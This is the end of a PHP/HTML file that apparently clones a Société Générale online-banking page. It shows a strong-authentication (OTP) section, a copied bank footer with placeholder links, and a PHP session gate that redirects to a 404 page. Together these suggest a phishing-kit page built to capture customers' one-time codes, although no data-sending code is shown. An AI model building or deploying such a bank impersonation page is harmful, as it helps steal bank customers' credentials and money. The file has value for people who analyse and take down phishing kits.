                                                <strong>une authentification renforcée tous les 180 jours
                                                </strong>
                                                .
                                            </p>
                                        </div>
                                        <!-- #eo2680-card -->

                                        <!-- #eo2680-card -->
                                        <p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)
                                        </p>
                                    </div>
                                    <!-- #eo2680-otp -->
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section class="dcw_gb_row dcw_gb_clearfix"></section>
            </section>
        </main>
        <!--footer 1 -->
        <div class="text-center d-none d-md-block"><img src="../assets/images/footer1.png" class="img-fluid" alt="Image Responsive">
        </div>
        <footer class="dcw_footer" role="contentinfo">
            <div class="dcw_footer-second">
                <div class="dcw_footer_container">
                    <nav class="dcw_footer-second_nav">
                        <ul class="dcw_footer-second_list">
                            <li class="dcw_footer-second_item">
                                <a data-tms-container-label="footer-general-shortcuts" href="#" data-tms-click-type="N" data-tms-element-label="trouver-une-agence"><svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false">
                                        <use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href=""></use>
                                    </svg>
                                    Trouver une agence
                                </a>
                            </li>
                            <li class="dcw_footer-second_item"><a data-tms-container-label="footer-general-shortcuts" href="#" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">
                                    <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false">
                                        <use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="">
                                        </use>
                                    </svg>
                                    Questions fréquentes
                                </a>
                            </li>
                            <li class="dcw_footer-second_item">
                                <div class="dcw_dropdown js-dropdown-light">
                                    <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale
                                    </button>
                                    <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false">
                                        <use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="">
                                        </use>
                                    </svg>
                                    <ul class="dcw_dropdown_list toggle_content">
                                        <li class="dcw_dropdown_item">
                                            <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée
                                            </a>
                                        </li>
                                        <li class="dcw_dropdown_item"><a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="professionnels">
                                                Professionnels
                                            </a>
                                        </li>
                                        <li class="dcw_dropdown_item"><a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="entreprises">
                                                Entreprises
                                            </a>
                                        </li>
                                        <li class="dcw_dropdown_item"><a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="associations">
                                                Associations
                                            </a>
                                        </li>
                                        <li class="dcw_dropdown_item"><a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="économie-publique">
                                                Économie publique
                                            </a>
                                        </li>
                                        <li class="dcw_dropdown_item"><a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="groupe-société-générale">
                                                Groupe Société Générale
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                        </ul>
                    </nav>
                    <ul class="dcw_footer_container dcw_footer-second_social">
                        <li class="dcw_footer-second_item-social">
                            <a data-tms-container-label="footer-social-links" title="Facebook" href="#" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook"><svg aria-hidden="true" focusable="false">
                                    <use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="img/pictos-fonctionnels_20200629183129.svg#facebook-2"></use>
                                </svg>
                            </a>
                        </li>
                        <li class="dcw_footer-second_item-social"><a data-tms-container-label="footer-social-links" title="Twitter" href="#" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">
                                <svg aria-hidden="true" focusable="false">
                                    <use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="img/pictos-fonctionnels_20200629183129.svg#twitter-2">
                                    </use>
                                </svg>
                            </a>
                        </li>
                        <li class="dcw_footer-second_item-social"><a data-tms-container-label="footer-social-links" title="Instagram" href="#" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">
                                <svg aria-hidden="true" focusable="false">
                                    <use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="img/pictos-fonctionnels_20200629183129.svg#instagram">
                                    </use>
                                </svg>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <nav class="dcw_footer-third">
                <div class="dcw_footer_container">
                    <img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="../assets/images/logo-sg-seul.svg" width="150">
                    <ul class="dcw_footer-third_list">
                        <li class="dcw_footer-third_item">
                            <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="sécurité">Sécurité
                            </a>
                        </li>
                        <li class="dcw_footer-third_item"><a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="nos-engagements">
                                Nos engagements
                            </a>
                        </li>
                        <li class="dcw_footer-third_item"><a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="gestion-des-cookies">
                                Gestion des Cookies
                            </a>
                        </li>
                        <li class="dcw_footer-third_item"><a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="données-personnelles">
                                Données personnelles
                            </a>
                        </li>
                        <li class="dcw_footer-third_item"><a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="documentation-et-tarifs">
                                Documentation et Tarifs
                            </a>
                        </li>
                        <li class="dcw_footer-third_item"><a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="informations-légales">
                                Informations légales
                            </a>
                        </li>
                        <li class="dcw_footer-third_item"><a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="accessibilité-numérique">
                                Accessibilité numérique
                            </a>
                        </li>
                    </ul>
                </div>
            </nav>
        </footer>
        <div id="interactWrapper" class="sdcwrapper"></div>
        <div id="interactWrapper" class="sdcwrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer interactCSSWrapper">
            <div class="interact-layout" id="content">
                <div class="interact-header"></div>
                <div class="interact-content"></div>
                <div class="interact-popin"></div>
                <div class="interact-footer"></div>
                <div class="interact-sticky">
                    <div id="tch_sticky-bar" class="tch_sticky-bar_container">
                        <div class="tch_sticky-contact_bar">
                            <h3 class="tch_sticky-bar_title">
                                Besoin d'aide
                            </h3>
                            <p class="tch_sticky-bar_message">Nos experts vous accompagnent dans le choix de la solution adaptée à vos besoins
                            </p>



    </body>
    </html>
<?php
}
else {
	session_destroy();
	header('Location ../404.php');
	
}
?>